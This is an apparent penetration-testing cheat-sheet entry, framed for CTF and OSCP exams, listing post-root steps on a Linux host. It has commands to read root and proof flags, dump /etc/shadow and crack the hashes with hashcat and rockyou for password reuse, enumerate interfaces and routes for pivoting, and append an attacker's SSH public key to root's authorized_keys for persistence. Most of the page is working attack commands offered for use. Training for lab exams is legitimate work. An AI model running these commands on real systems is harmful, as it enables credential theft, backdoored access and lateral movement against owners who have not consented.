---
id: root-linux
title: Root Flag / Proof (Linux)
stage: objective
tags: [linux]
tools:
  - cat /root/root.txt
  - cat /root/proof.txt
  - cat /etc/shadow
leads_to:
  - pivot
---

## Grab Proof

```bash
id && hostname && cat /root/root.txt
id && hostname && cat /root/proof.txt    # OSCP format
```

## Dump Shadow (for password reuse across network)

```bash
cat /etc/shadow
# Copy hashes → crack offline
hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt   # sha512crypt
```

## Check for Additional Networks

```bash
ip a
ip route
arp -a
cat /etc/hosts

# Internal services
ss -anp
```

## SSH Key Persistence

```bash
mkdir -p /root/.ssh
echo "ssh-rsa ATTACKER_PUBLIC_KEY" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys
```

## Notes

Always check for pivot opportunities immediately after rooting. New NICs, route table entries, or internal IPs in `/etc/hosts` indicate additional network segments — follow up with pivoting.
